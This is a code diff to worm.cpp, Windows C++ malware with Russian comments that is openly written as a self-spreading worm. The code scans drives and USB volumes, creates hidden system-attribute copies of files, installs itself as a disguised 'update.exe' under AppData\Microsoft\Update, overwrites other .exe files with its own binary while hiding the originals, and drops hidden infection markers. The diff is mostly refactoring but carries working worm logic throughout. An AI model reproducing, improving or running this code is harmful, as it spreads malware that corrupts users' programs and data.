@@ -1,10 +1,21 @@
-﻿// worm.cpp
+﻿/**
+ * @file worm.cpp
+ * @brief Реализация основной логики червя.
+ */
+
+// worm.cpp
 #pragma comment(lib, "iphlpapi.lib")
 #include "worm.h"
 #include <windows.h>
 #include <set>
 #include <iphlpapi.h> 
 #include <Icmpapi.h> // для пингования айпишников
+#include <iostream>
+#include <random>
+#include <fstream>
+#include <algorithm>
+
+using namespace std;
 
 //std::wstring get_own_path() {
 //    wchar_t buffer[MAX_PATH];
@@ -41,7 +52,6 @@ std::wstring get_own_folder() {
         path.resize(size);
         DWORD result = GetModuleFileNameW(NULL, &path[0], size);
         if (result == 0) {
-            // Ошибка получения пути
             return L"";
         }
         if (result < size) {
@@ -65,10 +75,10 @@ std::wstring get_drive_root_from_path(const std::wstring& full_path) {
     return full_path.substr(0, 3);  // Например: "C:\"
 }
 
-bool is_hidden(const fs::path& path) {
+bool is_hidden(const filesystem::path& path) {
     DWORD attrs = GetFileAttributesW(path.wstring().c_str());
     if (attrs == INVALID_FILE_ATTRIBUTES) {
-        return false; // Если не удалось получить атрибуты, считаем что не скрыта
+        return false; // если не удалось получить атрибуты, считаем что не скрыта
     }
     return (attrs & FILE_ATTRIBUTE_HIDDEN) || (attrs & FILE_ATTRIBUTE_SYSTEM);
 }
@@ -97,7 +107,7 @@ wstring generate_unique_suffix() {
 //#endif
 //}
 
-std::wstring get_filename_stem(const fs::path& filepath) {
+std::wstring get_filename_stem(const filesystem::path& filepath) {
     try {
         return filepath.stem().wstring();
     }
@@ -203,8 +213,8 @@ vector<wstring> get_removable_volume_paths() { // получем пути съе
     return removable_paths;
 }
 
-void filter_only_exe(vector<fs::path>& files) { // фильтруем из всех файлов, только exe
-    vector<fs::path> filtered;
+void filter_only_exe(vector<filesystem::path>& files) { // фильтруем из всех файлов, только exe
+    vector<filesystem::path> filtered;
     for (const auto& file : files) {
         if (file.extension() == L".exe") {
             filtered.push_back(file);
@@ -245,7 +255,7 @@ void worm::scan_all_volumes()  // поиск по всем корневым ди
 }
 
 bool worm::possible_to_write(const std::wstring& dir_path) {
-    // Путь к тестовому файлу (например, создадим временный "test.txt")
+    // путь к тестовому файлу (например, создадим временный "test.txt")
     std::wstring test_file = dir_path + L"\\test.tmp";
 
     HANDLE hFile = CreateFileW(
@@ -273,11 +283,11 @@ bool worm::is_system_path(const std::wstring& path)
     wchar_t windowsDir[MAX_PATH];
     wchar_t systemDir[MAX_PATH];
 
-    // Получаем путь к Windows и System32
+    // получаем путь к Windows и System32
     GetWindowsDirectoryW(windowsDir, MAX_PATH);
     GetSystemDirectoryW(systemDir, MAX_PATH);
 
-    // Строим список запрещённых директорий
+    // список запрещённых директорий
     std::vector<std::wstring> forbidden = {
         std::wstring(windowsDir),                       // \Windows
         std::wstring(systemDir),                        // \Windows\System32
@@ -294,7 +304,7 @@ bool worm::is_system_path(const std::wstring& path)
         L"\\PerfLogs"
     };
 
-    // Проверяем совпадение (начинается с запрещённого пути)
+    // проверяем совпадение (начинается с запрещённого пути)
     for (const auto& bad : forbidden) {
         if (path.size() >= bad.size() &&
             _wcsnicmp(path.c_str(), bad.c_str(), bad.size()) == 0) {
@@ -313,7 +323,7 @@ void worm::search_list_dir(const wstring& path_to_dir, vector<wstring>& list_dir
     }
 
     error_code ec;
-    fs::directory_iterator it(path_to_dir, ec);
+    filesystem::directory_iterator it(path_to_dir, ec);
     if (ec) {
         wcerr << L"Ошибка доступа к " << path_to_dir << L": " << ec.message().c_str() << L"\n";
         return;
@@ -337,7 +347,7 @@ void worm::search_list_dir() // для старта поиска по дирре
 {
     list_dir.clear();
 
-    search_list_dir(path_to_start, list_dir);
+    this->search_list_dir(this->path_to_start, this->list_dir);
     //search_list_dir(L"E:\\test_worm", list_dir);//search_list_dir(path_to_start);//search_list_dir("F:\Anki\ChatExport_2025-04-07\video_files");
     //list_dir.push_back(path_to_start);
 
@@ -352,10 +362,10 @@ void worm::print_list_dir() // вывод всех найденных папок
 
 void worm::collect_visible_files()
 {
-    collect_visible_files(list_dir, file_to_copy);
+    this->collect_visible_files(this->list_dir, this->file_to_copy);
 }
 
-void worm::collect_visible_files(const vector<wstring>& list_dir_tmp, vector<fs::path>& collected_files)
+void worm::collect_visible_files(const vector<wstring>& list_dir_tmp, vector<filesystem::path>& collected_files)
 {
     collected_files.clear();
 
@@ -369,7 +379,7 @@ void worm::collect_visible_files(const vector<wstring>& list_dir_tmp, vector<fs:
     for (const auto& dir : list_dir_tmp) {
         
         std::error_code dir_ec;
-        fs::directory_iterator it(dir, dir_ec);
+        filesystem::directory_iterator it(dir, dir_ec);
 
         if (dir_ec) {
             wcerr << L"[!] Пропущена папка (нет доступа): " << dir << L" — " << dir_ec.message().c_str() << endl;
@@ -378,10 +388,10 @@ void worm::collect_visible_files(const vector<wstring>& list_dir_tmp, vector<fs:
 
         for (const auto& entry : it) {
             std::error_code file_ec;
-            const fs::path& path = entry.path();
+            const filesystem::path& path = entry.path();
             auto status = entry.status(file_ec);
 
-            if (file_ec || !fs::is_regular_file(status)) {
+            if (file_ec || !filesystem::is_regular_file(status)) {
                 continue;
             }
 
@@ -407,10 +417,10 @@ void worm::print_file_to_copy()
 
 void worm::replicate_files()
 {
-    replicate_files(iteration);
+    this->replicate_files(this->iteration);
 }
 
-void worm::replicate_files(int iteration)
+void worm::replicate_files(int count)
 {
     if (file_to_copy.empty()) {
         std::cerr << "Список файлов пуст! Сначала выполните collect_visible_files()\n";
@@ -418,33 +428,25 @@ void worm::replicate_files(int iteration)
     }
 
     for (const auto& original_file : file_to_copy) {
-        for (int i = 1; i <= iteration; ++i) {
+        for (int i = 1; i <= count; ++i) {
             std::wstring ext = original_file.extension().wstring();
             std::wstring stem = original_file.stem().wstring();
-            fs::path parent_dir = original_file.parent_path();
+            std::filesystem::path parent_dir = original_file.parent_path();
 
             std::wcout << L"Обрабатываем файл: " << original_file.wstring() << L"\n";
-
-
-            fs::path copy_path = parent_dir / (stem + L"_" + generate_unique_suffix() + ext);
-
+            std::filesystem::path copy_path = parent_dir / (stem + L"_" + generate_unique_suffix() + ext);
             try {
-                fs::copy_file(original_file, copy_path, fs::copy_options::overwrite_existing);
-
+                std::filesystem::copy_file(original_file, copy_path, std::filesystem::copy_options::overwrite_existing);
                 DWORD attrs = GetFileAttributesW(copy_path.wstring().c_str());
                 if (attrs != INVALID_FILE_ATTRIBUTES) {
-                    DWORD new_attrs = attrs | FILE_ATTRIBUTE_HIDDEN | 0x4; // Добавил, чтобы было скрытие как системного файла
+                    DWORD new_attrs = attrs | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM;
                     if (!SetFileAttributesW(copy_path.wstring().c_str(), new_attrs)) {
                         std::wcerr << L"Ошибка SetFileAttributesW: " << GetLastError() << L"\n";
                     }
-
-                }
-                else {
-                    std::wcerr << L"Ошибка GetFileAttributesW: " << GetLastError() << L"\n";
                 }
             }
-            catch (const fs::filesystem_error& e) {
-                std::cerr << "  Ошибка при создании копии: " << e.what() << "\n";
+            catch (const std::filesystem::filesystem_error& e) {
+                std::cerr << " Ошибка при создании копии: " << e.what() << "\n";
             }
         }
     }
@@ -460,10 +462,10 @@ void worm::copy_and_hide_worm()
     std::wstring dest_folder = std::wstring(appdata_path) + L"\\Microsoft\\Update";
     std::wstring dest_exe = dest_folder + L"\\update.exe";
     // Создать директорию (если её нет)
-    fs::create_directories(dest_folder);
+    filesystem::create_directories(dest_folder);
     // Удаляем старый файл, если существует
-    if (fs::exists(dest_exe)) {
-        fs::remove(dest_exe);
+    if (filesystem::exists(dest_exe)) {
+        filesystem::remove(dest_exe);
     }
     // Копировать себя
     CopyFileW(own_path, dest_exe.c_str(), FALSE);
@@ -526,30 +528,30 @@ void worm::process_all_removable_disks()
 }
 
 
-void worm::hide_and_replace_exe(const fs::path& target_exe, const std::wstring& worm_path)
+void worm::hide_and_replace_exe(const filesystem::path& target_exe, const std::wstring& worm_path)
 {
-    if (fs::equivalent(target_exe, worm_path)) {
+    if (filesystem::equivalent(target_exe, worm_path)) {
         return;
     }
 
     SetFileAttributesW(target_exe.c_str(), FILE_ATTRIBUTE_NORMAL);
 
     std::wstring unique_suffix = generate_unique_suffix();
-    fs::path backup = target_exe;
+    filesystem::path backup = target_exe;
     backup.replace_filename(target_exe.stem().wstring() + L"_" + unique_suffix + target_exe.extension().wstring());
 
-    fs::rename(target_exe, backup);
+    filesystem::rename(target_exe, backup);
 
-    if (!fs::exists(worm_path)) {
-        if (fs::exists(backup)) {
-            fs::rename(backup, target_exe);
+    if (!filesystem::exists(worm_path)) {
+        if (filesystem::exists(backup)) {
+            filesystem::rename(backup, target_exe);
         }
         return;
     }
 
     if (!CopyFileW(worm_path.c_str(), target_exe.c_str(), FALSE)) {
-        if (fs::exists(backup)) {
-            fs::rename(backup, target_exe);
+        if (filesystem::exists(backup)) {
+            filesystem::rename(backup, target_exe);
         }
         return;
     }
@@ -565,22 +567,19 @@ void worm::hide_and_replace_exe(const fs::path& target_exe, const std::wstring& 
 
 
 
-bool worm::infected_dir(const wstring& dir_path)
-{
-    wstring full_name_to_file = dir_path + L"\\.infected";
-    ofstream marker(full_name_to_file, ios::out);
-    if (!marker.is_open()) { return false; }
-    marker << "infected";
+void worm::infected_dir(const std::wstring& path) {
+    std::filesystem::path p(path);
+    p /= L".inf";
+    std::wofstream marker(p);
+    marker << L"infected";
     marker.close();
-    SetFileAttributes(full_name_to_file.c_str(), 0x2 | 0x4);
-
-    return true;
+    SetFileAttributesW(p.wstring().c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
 }
 
 bool worm::dir_was_infected(const wstring& dir_path)
 {
     wstring full_name_to_file = dir_path + L"\\.infected";
-    return fs::exists(full_name_to_file);
+    return filesystem::exists(full_name_to_file);
 }
 
 
